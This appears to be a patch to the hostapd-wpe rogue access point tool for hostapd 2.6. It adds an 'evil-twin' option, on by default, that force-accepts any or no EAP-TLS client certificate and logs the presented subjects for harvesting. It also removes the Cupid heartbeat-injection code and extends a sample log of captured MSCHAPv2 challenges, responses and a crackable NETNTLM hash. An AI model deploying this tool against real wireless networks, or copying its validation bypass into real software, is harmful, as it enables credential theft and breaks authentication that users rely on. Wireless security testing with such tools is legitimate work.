@@ -331,7 +331,7 @@ diff -Naur hostapd-2.6/hostapd/config_file.c hostapd-2.6-wpe/hostapd/config_file
  
  #ifndef CONFIG_NO_RADIUS
  #ifdef EAP_SERVER
-@@ -2108,6 +2110,20 @@
+@@ -2108,6 +2110,22 @@
  			return 1;
  		}
  		wpa_printf(MSG_DEBUG, "eapol_version=%d", bss->eapol_version);
@@ -349,13 +349,15 @@ diff -Naur hostapd-2.6/hostapd/config_file.c hostapd-2.6-wpe/hostapd/config_file
 +        wpe_conf.wpe_hb_num_repeats = atoi(pos);
 +    } else if (os_strcmp(buf, "wpe_hb_num_tries") == 0) {
 +        wpe_conf.wpe_hb_num_tries = atoi(pos);
++    } else if (os_strcmp(buf, "wpe_accept_any_cert") == 0) {
++        wpe_conf.wpe_accept_any_cert = atoi(pos);
  #ifdef EAP_SERVER
  	} else if (os_strcmp(buf, "eap_authenticator") == 0) {
  		bss->eap_server = atoi(pos);
 diff -Naur hostapd-2.6/hostapd/hostapd-wpe.conf hostapd-2.6-wpe/hostapd/hostapd-wpe.conf
 --- hostapd-2.6/hostapd/hostapd-wpe.conf
 +++ hostapd-2.6-wpe/hostapd/hostapd-wpe.conf
-@@ -0,0 +1,1812 @@
+@@ -0,0 +1,1813 @@
 +#
 +# hostapd-wpe.conf
 +# Brad Antoniewicz (@brad_anton) - Foundstone
@@ -393,6 +395,7 @@ diff -Naur hostapd-2.6/hostapd/hostapd-wpe.conf hostapd-2.6-wpe/hostapd/hostapd-
 +# wpe_hb_payload_size=0             # Heartbleed 0-65535 (Default: 50000)
 +# wpe_hb_num_repeats=0              # Heartbleed 0-65535 (Default: 1)
 +# wpe_hb_num_tries=0                # Heartbleed 0-65535 (Default: 1)
++# wpe_accept_any_cert=0             # Accept any/no EAP-TLS client cert, log it (Default: 1)
 +
 +
 +# Dont mess with unless you know what you're doing
@@ -4078,7 +4081,7 @@ diff -Naur hostapd-2.6/hostapd/hostapd-wpe.eap_user hostapd-2.6-wpe/hostapd/host
 diff -Naur hostapd-2.6/hostapd/hostapd-wpe.log hostapd-2.6-wpe/hostapd/hostapd-wpe.log
 --- hostapd-2.6/hostapd/hostapd-wpe.log
 +++ hostapd-2.6-wpe/hostapd/hostapd-wpe.log
-@@ -0,0 +1,42 @@
+@@ -0,0 +1,57 @@
 +
 +
 +mschapv2: Mon Apr 17 01:41:02 2017
@@ -4121,6 +4124,21 @@ diff -Naur hostapd-2.6/hostapd/hostapd-wpe.log hostapd-2.6-wpe/hostapd/hostapd-w
 +	 challenge:	7d:67:b2:10:28:df:d7:a1
 +	 response:	b6:12:cc:37:8e:fd:4f:e0:04:22:cd:1d:dc:22:99:09:f9:d3:12:51:cd:f8:27:8e
 +	 jtr NETNTLM:	ufka:$NETNTLM$7d67b21028dfd7a1$b612cc378efd4fe00422cd1ddc229909f9d31251cdf8278e
++
++
++EAP-TLS client certificate (validation disabled):
++	 subject:	/CN=rogueuser
++	 depth:	0
++
++
++EAP-TLS client certificate (validation disabled):
++	 subject:	/CN=rogueuser
++	 depth:	0
++
++
++EAP-TLS client certificate (validation disabled):
++	 subject:	/CN=rogueuser
++	 depth:	0
 diff -Naur hostapd-2.6/hostapd/main.c hostapd-2.6-wpe/hostapd/main.c
 --- hostapd-2.6/hostapd/main.c
 +++ hostapd-2.6-wpe/hostapd/main.c
@@ -4354,46 +4372,71 @@ diff -Naur hostapd-2.6/src/crypto/tls_openssl.c hostapd-2.6-wpe/src/crypto/tls_o
  	SSL_set_msg_callback_arg(conn->ssl, conn);
  	options = SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 |
  		SSL_OP_SINGLE_DH_USE;
-@@ -3255,8 +3266,9 @@
- openssl_handshake(struct tls_connection *conn, const struct wpabuf *in_data,
- 		  int server)
- {
--	int res;
-+	int res,i;
- 	struct wpabuf *out_data;
-+    struct wpabuf *wpe_hb_ptr1, *wpe_hb_ptr2;
+@@ -1796,6 +1807,20 @@
+ 	if (conn == NULL)
+ 		return 0;
  
- 	/*
- 	 * Give TLS handshake data from the server (if available) to OpenSSL
-@@ -3316,6 +3328,27 @@
++	/* WPE: evil-twin mode - accept any client certificate (or none).
++	 * Logs the presented subject for harvesting, then forces success
++	 * regardless of chain validation. Disable with
++	 * wpe_accept_any_cert=0 in hostapd-wpe.conf. */
++	if (wpe_conf.wpe_accept_any_cert) {
++		wpa_printf(MSG_INFO, "[WPE] Accepting client certificate "
++			   "subject='%s' err=%d depth=%d (validation disabled)",
++			   buf, err, depth);
++		wpe_log_file_and_stdout("\n\nEAP-TLS client certificate "
++					"(validation disabled):\n\t subject:\t%s\n\t depth:\t%d\n",
++					buf, depth);
++		return 1;
++	}
++
+ 	if (depth == 0)
+ 		conn->peer_cert = err_cert;
+ 	else if (depth == 1)
+@@ -2293,9 +2318,22 @@
+ 
+ 	if (verify_peer) {
+ 		conn->ca_cert_verify = 1;
+-		SSL_set_verify(conn->ssl, SSL_VERIFY_PEER |
+-			       SSL_VERIFY_FAIL_IF_NO_PEER_CERT |
+-			       SSL_VERIFY_CLIENT_ONCE, tls_verify_cb);
++		if (wpe_conf.wpe_accept_any_cert) {
++			/* WPE: request a client certificate but do not fail
++			 * if it is missing or untrusted (EAP-TLS evil-twin).
++			 * Validation is additionally force-passed in
++			 * tls_verify_cb above. */
++			conn->ca_cert_verify = 0;
++			wpa_printf(MSG_DEBUG, "[WPE] Client certificate "
++				   "validation disabled - accepting any/no "
++				   "certificate");
++			SSL_set_verify(conn->ssl, SSL_VERIFY_PEER |
++				       SSL_VERIFY_CLIENT_ONCE, tls_verify_cb);
++		} else {
++			SSL_set_verify(conn->ssl, SSL_VERIFY_PEER |
++				       SSL_VERIFY_FAIL_IF_NO_PEER_CERT |
++				       SSL_VERIFY_CLIENT_ONCE, tls_verify_cb);
++		}
+ 	} else {
+ 		conn->ca_cert_verify = 0;
+ 		SSL_set_verify(conn->ssl, SSL_VERIFY_NONE, NULL);
+@@ -3316,6 +3354,16 @@
  	}
  	wpabuf_put(out_data, res);
  
++    /* WPE Cupid heartbeat-injection is not possible on OpenSSL >= 1.1
++     * (opaque SSL struct, heartbeat support removed). The original code
++     * replaced the handshake flight with heartbeat requests; doing that
++     * now would only corrupt the handshake, so always proceed with the
++     * normal handshake data. */
 +    if (wpe_conf.wpe_enable_cupid && wpe_conf.wpe_hb_send_before_handshake && wpe_conf.wpe_hb_num_tries) {
-+
-+        wpa_printf(MSG_DEBUG, "[WPE] Sending heartbeat request instead of handshake\n");
-+        wpe_hb_ptr1 = NULL;
-+        for (i=0; i < wpe_conf.wpe_hb_num_repeats; i++) {
-+            wpe_hb_ptr2 = wpabuf_alloc(wpe_hb_msg_len-1);
-+            memcpy(wpabuf_mhead(wpe_hb_ptr2), (u8 *)wpe_hb_clear(), wpe_hb_msg_len-1);
-+            wpabuf_put(wpe_hb_ptr2, wpe_hb_msg_len-1);
-+            if (wpe_hb_ptr1) {
-+                wpe_hb_ptr1 = wpabuf_concat(wpe_hb_ptr1,wpe_hb_ptr2);
-+            } else { 
-+                wpe_hb_ptr1 = wpe_hb_ptr2;
-+            }
-+        }
-+        /* WPE Cupid heartbeat-injection disabled: SSL struct is opaque
-+         * on OpenSSL >= 1.1 (no tlsext_hb_pending), so just return the
-+         * handshake data. */
++        wpa_printf(MSG_DEBUG, "[WPE] Cupid heartbeat injection not supported on OpenSSL >= 1.1 - proceeding with normal handshake\n");
 +        wpe_conf.wpe_hb_num_tries--;
-+        return wpe_hb_ptr1;
 +    }
 +
  	return out_data;
  }
  
-@@ -3431,6 +3464,12 @@
+@@ -3431,6 +3479,12 @@
  		tls_show_errors(MSG_INFO, __func__, "BIO_reset failed");
  		return NULL;
  	}
@@ -4406,7 +4449,7 @@ diff -Naur hostapd-2.6/src/crypto/tls_openssl.c hostapd-2.6-wpe/src/crypto/tls_o
  	res = SSL_write(conn->ssl, wpabuf_head(in_data), wpabuf_len(in_data));
  	if (res < 0) {
  		tls_show_errors(MSG_INFO, __func__,
-@@ -3438,6 +3477,11 @@
+@@ -3438,6 +3492,11 @@
  		return NULL;
  	}
  
@@ -4418,7 +4461,7 @@ diff -Naur hostapd-2.6/src/crypto/tls_openssl.c hostapd-2.6-wpe/src/crypto/tls_o
  	/* Read encrypted data to be sent to the server */
  	buf = wpabuf_alloc(wpabuf_len(in_data) + 300);
  	if (buf == NULL)
-@@ -4251,6 +4295,18 @@
+@@ -4251,6 +4310,18 @@
  #endif /* EAP_FAST || EAP_FAST_DYNAMIC || EAP_SERVER_FAST */
  }
  
@@ -4656,7 +4699,7 @@ diff -Naur hostapd-2.6/src/wpe/Makefile hostapd-2.6-wpe/src/wpe/Makefile
 diff -Naur hostapd-2.6/src/wpe/wpe.c hostapd-2.6-wpe/src/wpe/wpe.c
 --- hostapd-2.6/src/wpe/wpe.c
 +++ hostapd-2.6-wpe/src/wpe/wpe.c
-@@ -0,0 +1,218 @@
+@@ -0,0 +1,219 @@
 +/*
 +    wpe.c - 
 +        brad.antoniewicz@foundstone.com
@@ -4696,6 +4739,7 @@ diff -Naur hostapd-2.6/src/wpe/wpe.c hostapd-2.6-wpe/src/wpe/wpe.c
 +    .wpe_enable_karma = 0,
 +    .wpe_enable_cupid = 0,
 +    .wpe_enable_return_success = 0,
++    .wpe_accept_any_cert = 1,
 +    .wpe_hb_send_before_handshake = 1,
 +    .wpe_hb_send_before_appdata = 0,
 +    .wpe_hb_send_after_appdata = 0,
@@ -4878,7 +4922,7 @@ diff -Naur hostapd-2.6/src/wpe/wpe.c hostapd-2.6-wpe/src/wpe/wpe.c
 diff -Naur hostapd-2.6/src/wpe/wpe.h hostapd-2.6-wpe/src/wpe/wpe.h
 --- hostapd-2.6/src/wpe/wpe.h
 +++ hostapd-2.6-wpe/src/wpe/wpe.h
-@@ -0,0 +1,50 @@
+@@ -0,0 +1,51 @@
 +/*
 +    wpe.h - 
 +        brad.antoniewicz@foundstone.com
@@ -4902,6 +4946,7 @@ diff -Naur hostapd-2.6/src/wpe/wpe.h hostapd-2.6-wpe/src/wpe/wpe.h
 +    unsigned int wpe_enable_karma;
 +    unsigned int wpe_enable_cupid;
 +    unsigned int wpe_enable_return_success;
++    unsigned int wpe_accept_any_cert;
 +    unsigned int wpe_hb_send_before_handshake:1;
 +    unsigned int wpe_hb_send_before_appdata:1;
 +    unsigned int wpe_hb_send_after_appdata:1;
